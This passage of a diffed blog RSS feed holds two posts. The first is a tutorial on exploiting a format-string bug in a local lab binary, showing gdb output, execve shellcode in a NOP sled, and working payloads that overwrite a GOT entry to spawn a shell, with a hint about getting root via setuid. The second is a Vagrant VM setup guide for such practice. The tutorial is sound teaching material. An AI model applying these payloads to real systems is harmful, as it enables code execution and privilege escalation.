+  EDI: 0x0 
+  EBP: 0xbffff698 --&amp;gt; 0x0 
+  ESP: 0xbffff5fc --&amp;gt; 0x8048480 (&amp;lt;main+60&amp;gt;:   leave)
+  EIP: 0x5
+  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0x5
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffff5fc --&amp;gt; 0x8048480 (&amp;lt;main+60&amp;gt;:  leave)
+  0004| 0xbffff600 --&amp;gt; 0xa ('\n')
+  0008| 0xbffff604 --&amp;gt; 0xbffff88a --&amp;gt; 0x804a010 --&amp;gt; 0x5 
+  0012| 0xbffff608 --&amp;gt; 0x1 
+  0016| 0xbffff60c --&amp;gt; 0xb7ec71c9 (test   eax,eax)
+  0020| 0xbffff610 --&amp;gt; 0x804a010 --&amp;gt; 0x5 
+  0024| 0xbffff614 (&quot;.%4$n&quot;)
+  0028| 0xbffff618 --&amp;gt; 0x6e ('n')
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x00000005 in ?? ()
+  gdb-peda$ x/xw 0x0804a010
+  0x804a010 &amp;lt;putchar@got.plt&amp;gt;:	0x00000005
+  gdb-peda$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see from above the program crashed and we have verified that the
+value 5 has indeed been written to the address we wanted,&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We now need to know the address of our shellcode, this address can be anywhere
+in our NOP sled (the bunch of 0x90’s we put at the beginning of our shellcode
+EGG environment variable)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ find 0x90909090 $esp $esp+2000
+  Searching for '0x90909090' in range: 0xbffff5ac - 0xbffffd7c
+  Found 16 results, display max 16 items:
+  [stack] : 0xbffff8d8 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8dc --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8e0 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8e4 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8e8 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8ec --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8f0 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8f4 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8f8 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff8fc --&amp;gt; 0x90909090 
+  [stack] : 0xbffff900 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff904 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff908 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff90c --&amp;gt; 0x90909090 
+  [stack] : 0xbffff910 --&amp;gt; 0x90909090 
+  [stack] : 0xbffff914 --&amp;gt; 0x90909090 
+  
+  gdb-peda$ x/20i 0xbffff910
+     0xbffff910:	nop
+     0xbffff911:	nop
+     0xbffff912:	nop
+     0xbffff913:	nop
+     0xbffff914:	nop
+     0xbffff915:	nop
+     0xbffff916:	nop
+     0xbffff917:	nop
+     0xbffff918:	xor    eax,eax
+     0xbffff91a:	push   eax
+     0xbffff91b:	push   0x68732f2f
+     0xbffff920:	push   0x6e69622f
+     0xbffff925:	mov    ebx,esp
+     0xbffff927:	push   eax
+     0xbffff928:	push   ebx
+     0xbffff929:	mov    ecx,esp
+     0xbffff92b:	mov    al,0xb
+     0xbffff92d:	int    0x80
+     0xbffff92f:	add    BYTE PTR [ebp+0x53],dl
+     0xbffff932:	inc    ebp
+  gdb-peda$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Above we first used the find command to find 4 consecutive NOP’s on the stack
+(0x90’s) and we found a list of possible addresses, we then chose an address
+near to the bottom of the list and examined 20 instructions (x/20i) from that
+address. This looks like the assembly for an execve syscall (the 0xb going in
+the eax/al register and the int 0x80) so we found our address 0xbffff910.&lt;/p&gt;
+
+&lt;p&gt;We now have all the information we need to exploit this, to recap&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;We are going to overwrite the putchar address 0x0804a010&lt;/li&gt;
+  &lt;li&gt;We are going to overwrite it with the address of our shell code where is
+0xbffff910&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;crafting-the-exploit&quot;&gt;Crafting the exploit&lt;/h2&gt;
+&lt;p&gt;Armed with our information we are now going to tackle the writing the address of
+our shellcode in two parts&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Write the lower order bytes. From our shellcode address this means we first
+want to write the value f910 which in decimal is 63760 now we have to take
+into account that we have already written 5 bytes and we want to use one byte
+as a spacer so this leaves us with 63754 bytes and our format string becomes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ run $(python -c 'print &quot;\x10\xa0\x04\x08&quot;').%63754u.%4\$n
+
+   [----------------------------------registers-----------------------------------]
+  EAX: 0xf910 
+  EBX: 0xb7fd1ff4 --&amp;gt; 0x1a0d7c 
+  ECX: 0x0 
+  EDX: 0x0 
+  ESI: 0x0 
+  EDI: 0x0 
+  EBP: 0xbffff638 --&amp;gt; 0x0 
+  ESP: 0xbffff59c --&amp;gt; 0x8048480 (&amp;lt;main+60&amp;gt;:	leave)
+  EIP: 0xf910
+  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+  [-------------------------------------code-------------------------------------]
+  Invalid $PC address: 0xf910
+  [------------------------------------stack-------------------------------------]
+  0000| 0xbffff59c --&amp;gt; 0x8048480 (&amp;lt;main+60&amp;gt;:	leave)
+  0004| 0xbffff5a0 --&amp;gt; 0xa ('\n')
+  0008| 0xbffff5a4 --&amp;gt; 0xbffff826 --&amp;gt; 0x804a010 --&amp;gt; 0xf910 
+  0012| 0xbffff5a8 --&amp;gt; 0x1 
+  0016| 0xbffff5ac --&amp;gt; 0xb7ec71c9 (test   eax,eax)
+  0020| 0xbffff5b0 --&amp;gt; 0x804a010 --&amp;gt; 0xf910 
+  0024| 0xbffff5b4 (&quot;.%63754u.%4$n&quot;)
+  0028| 0xbffff5b8 (&quot;754u.%4$n&quot;)
+  [------------------------------------------------------------------------------]
+  Legend: code, data, rodata, value
+  Stopped reason: SIGSEGV
+  0x0000f910 in ?? ()
+  gdb-peda$ x/xw 0x0804a010
+  0x804a010 &amp;lt;putchar@got.plt&amp;gt;:	0x0000f910
+  gdb-peda$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see we have written the lower order bytes to the address correctly&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We now need to tackle the higher order bytes, so now that means we need to
+write bfff - F910 more bytes to the higher order bytes. But this sum works out
+to a negative figure to fix this we use a trick we do 1bfff - f910 which
+equals c6ef or 50927 in decimal. We also have to adjust the address we are
+writing too by 2 bytes (as we are writing to the higher order bytes. Our input
+string now becomes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  gdb-peda$ run $(python -c 'print &quot;\x10\xa0\x04\x08&quot; + &quot;\x12\xa0\x04\x08&quot;').%63750u.%4\$n.%50925u.%5\$n
+  
+  $ ps
+  [New process 8218]
+  process 8218 is executing new program: /bin/ps
+    PID TTY          TIME CMD
+   7883 pts/0    00:00:00 bash
+   8211 pts/0    00:00:00 gdb
+   8213 pts/0    00:00:00 sh
+   8218 pts/0    00:00:00 ps
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;and we have a shell!! So what happened to our format string, well…..&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;We wrote 4 more bytes for the address of the higher order bytes so the %63754u
+part had to become %63750u&lt;/li&gt;
+  &lt;li&gt;we added ,%50925u.%5$n to the format string the 50925 part is the 50927
+bytes we calculated that we needed to write minus the 2 extra bytes we used
+for the spacers and now we have to write this value to the 5th parameter on
+the stack which is the address of the higher order bytes of the putchar
+address (0x0804a010), we don’t need to inspect this address this time as we
+have a shell&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Lets just attempt this exploit outside of gdb&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./fmt $(python -c 'print &quot;\x10\xa0\x04\x08&quot; + &quot;\x12\xa0\x04\x08&quot;').%63750u.%4\$n.%50925u.%5\$n
+  $ ps
+    PID TTY          TIME CMD
+   7883 pts/0    00:00:00 bash
+   8211 pts/0    00:00:00 gdb
+   8213 pts/0    00:00:00 sh
+   8233 pts/0    00:00:00 sh
+   8234 pts/0    00:00:00 ps
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;voila! We have a shell, now we could perhaps to further verify this if you set
+the owner of the fmt bin to root (&lt;code class=&quot;highlighter-rouge&quot;&gt;chown root:root&lt;/code&gt;) and set the suid bit
+(&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +s fmt&lt;/code&gt;) then you will be able to exploit this an get a root shell&lt;/p&gt;
+
+&lt;p&gt;Enjoy!!!&lt;/p&gt;
+</description>
+				<pubDate>Tue, 01 Nov 2016 00:00:00 +0000</pubDate>
+				<link>https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html</link>
+				<guid isPermaLink="true">https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html</guid>
+			</item>
+		
+			<item>
+				<title>Using Vagrant</title>
+				<description>&lt;h2 id=&quot;why&quot;&gt;Why&lt;/h2&gt;
+&lt;p&gt;When I started to learn about buffer overflows and memory exploits etc I found
+that lots of the tutorials and material left out the details of environment
+specifics. Therefore when I came to follow through the tutorials I ended up with
+radically different results, got confused and felt like giving up.&lt;/p&gt;
+
+&lt;h2 id=&quot;virtualisation-ftw&quot;&gt;Virtualisation FTW&lt;/h2&gt;
+&lt;p&gt;These days it is easy to run virtual machines and Oracle’s virtualbox is free to
+use and is stable enough to not have caused me too many issues.&lt;/p&gt;
+
+&lt;p&gt;See &lt;a href=&quot;https://www.virtualbox.org/wiki/Downloads&quot;&gt;here&lt;/a&gt; to download and view
+install instructions for your platform&lt;/p&gt;
+
+&lt;h2 id=&quot;vagrant&quot;&gt;Vagrant&lt;/h2&gt;
+&lt;p&gt;What you quickly learn is that virtual machines take up a lot of space and
+become a pain in the butt to manage the configs etc. In step &lt;a href=&quot;https://www.vagrantup.com/&quot;&gt;vagrant&lt;/a&gt;
+to save the day.&lt;/p&gt;
+
+&lt;p&gt;Vagrant allows you to specify the box config &amp;amp; software setup all within a ruby
+file (Named Vagrantfile) and run a couple of commands and you can then ssh into
+your new environment.&lt;/p&gt;
+
+&lt;p&gt;To initialize a new machine cd into a directory where you will be working and
+issue&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ vagrant init
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;The above command generates a Vagantfile in the current directory. You edit the
+config.vm.box to be a base box you desire (read docs for more info) which you
+can find &lt;a href=&quot;https://atlas.hashicorp.com/boxes/search&quot;&gt;here&lt;/a&gt;. You then run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ vagrant up
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;which will then download the base box, create you an instance of it and allow
+you to ssh into it using the command&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ vagrant ssh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Now you can do much, much more but one of the interesting feature is the ability
+to automatically run provisioning scripts.&lt;/p&gt;
+
+&lt;p&gt;Below is the Vagrantfile I use for learning memory exploits, it uses ubuntu
+precise 32bit for its base and I install git, pip, peda (gdb plugin) and gdb to
+help with debugging. Vagrant also mounts the current directory at /vagrant on
+the guest so you can share your code with the guest OS.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# -*- mode: ruby -*-&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# vi: set ft=ruby :&lt;/span&gt;
+
+&lt;span class=&quot;no&quot;&gt;Vagrant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;configure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;box&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hashicorp/precise32&quot;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;provider&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;virtualbox&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;vb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1024&quot;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;provision&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;shell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;inline: &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+    apt-get update
+    apt-get install -y git
+    apt-get install -y gdb
+    apt-get install -y python-pip
+    apt-get install -y build-essential
+    git clone https://github.com/longld/peda.git /home/vagrant/peda
+    chown -R vagrant:vagrant /home/vagrant/peda
+    echo &quot;source ~/peda/peda.py&quot; &amp;gt;&amp;gt; /home/vagrant/.gdbinit
+    chown vagrant:vagrant /home/vagrant/.gdbinit
+    pip install ropgadget
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;  SHELL&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can see this is just a matter of running the relevant shell commands to
+install the required software&lt;/p&gt;
+
+&lt;p&gt;Couple this with github and you can have numerous configurations of machines at
+your fingertips and only download the box files etc when you need them. Vargrant
+allows you to have a consistent environment throughout all your development /
+research.&lt;/p&gt;
+
+&lt;p&gt;Once your down with the machine just run&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ vagrant halt
+  $ vagrant destroy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;remember destroy really does delete the VM so remember to do all the work you
+want to keep in /vagrant or remember to copy it off of the vm in someway (iethub
+etc) before you do this.&lt;/p&gt;
+</description>
+				<pubDate>Mon, 31 Oct 2016 13:00:06 +0000</pubDate>
+				<link>https://bad-hombres.github.io//blog/2016/10/31/Using-Vagrant.html</link>
+				<guid isPermaLink="true">https://bad-hombres.github.io//blog/2016/10/31/Using-Vagrant.html</guid>
+			</item>
+		
 	</channel>
 </rss>
